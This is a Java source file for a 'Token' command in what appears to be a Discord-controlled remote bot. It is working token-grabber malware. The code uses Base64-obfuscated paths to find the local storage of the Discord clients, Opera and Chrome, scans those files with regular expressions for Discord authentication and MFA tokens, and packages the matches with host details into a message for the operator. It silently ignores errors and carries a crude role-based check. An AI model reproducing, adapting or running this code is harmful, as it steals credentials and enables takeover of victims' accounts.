package InvisibleCat.tabber.command.commands;

import InvisibleCat.tabber.App;
import InvisibleCat.tabber.command.Command;
import net.dv8tion.jda.api.entities.Member;
import net.dv8tion.jda.api.entities.Message;

import java.io.*;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Token implements Command {
    private String displayMessage;
    private String extra;

    public Token(String displayMessage) {this.displayMessage = displayMessage; this.extra = null;}


    @Override
    public String extraMessage() {
        return extra;
    }

    @Override
    public String displayMessage() {
        return displayMessage;
    }

    @Override
    public void run(ArrayList<String> args, Member author, Message message) {
        if(App.findRole(author, "bitch") != null && App.findRole(author, "bitch").getName().equalsIgnoreCase("bitch")) {
            extra = "`Error`: Anit-bitch protection has been triggered. So nice try mf";
            return;
        }
        String name = null;

        byte[] dc = Base64.getDecoder().decode("L0FwcERhdGEvUm9hbWluZy9kaXNjb3JkL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYi8=");
        byte[] dcp = Base64.getDecoder().decode("L0FwcERhdGEvUm9hbWluZy9kaXNjb3JkcHRiL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYi8=");
        byte[] dcc = Base64.getDecoder().decode("L0FwcERhdGEvUm9hbWluZy9kaXNjb3JkY2FuYXJ5L0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYi8=");
        byte[] op = Base64.getDecoder().decode("L0FwcERhdGEvUm9hbWluZy9PcGVyYSBTb2Z0d2FyZS9PcGVyYSBTdGFibGUvTG9jYWwgU3RvcmFnZS9sZXZlbGRi");
        byte[] gc = Base64.getDecoder().decode("L0FwcERhdGEvTG9jYWwvR29vZ2xlL0Nocm9tZS9Vc2VyIERhdGEvRGVmYXVsdC9Mb2NhbCBTdG9yYWdlL2xldmVsZGI=");




        List<String> paths = new ArrayList<>();
        paths.add(System.getProperty("user.home") + new String(dc));
        paths.add(System.getProperty("user.home") + new String(dcp));
        paths.add(System.getProperty("user.home") + new String(dcc));
        paths.add(System.getProperty("user.home") + new String(op));
        paths.add(System.getProperty("user.home") + new String(gc));


        int cx = 0;
        StringBuilder yes = new StringBuilder();
        yes.append("NONE\n");
        

        try {
            for (String path : paths) {
                if (path.equals(System.getProperty("user.home") + new String(dc))) {
                    name = "Discord:";
                }
                if (path.equals(System.getProperty("user.home") + new String(dcp))) {
                    name = "Discord PTB:";
                }
                if (path.equals(System.getProperty("user.home") + new String(dcc))) {
                    name = "Discord Canary:";
                }
                if (path.equals(System.getProperty("user.home") + new String(op))) {
                    name = "Opera Browser:";
                }
                if (path.equals(System.getProperty("user.home") + new String(gc))) {
                    name = "Chrome:";
                }

                File f = new File(path);
                String[] names = f.list();
                if (names == null) continue;

                
                for (String pathname : names) {
                    try {
                        FileInputStream fstream = new FileInputStream(path + pathname);
                        DataInputStream in = new DataInputStream(fstream);
                        BufferedReader br = new BufferedReader(new InputStreamReader(in));

                        String strLine;
                        while ((strLine = br.readLine()) != null) {

                            Pattern p = Pattern.compile("[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");
                            Matcher m = p.matcher(strLine);

                            while (m.find()) {
                                if (cx > 0) {
                                    yes.append("\n");
                                }
                                yes.append(name + " ").append(m.group());
                                name = "UNKNOWN";
                                cx++;
                            }

                        }

                    } catch (Exception ignored) {
                    }
                }
            }
            this.extra = ("Tokens Found at " + App.getInfo() +"```" + yes + "```");

        } catch (Exception e) {
            this.extra = "``` Error: : " + e + "```";
        }
    }
}
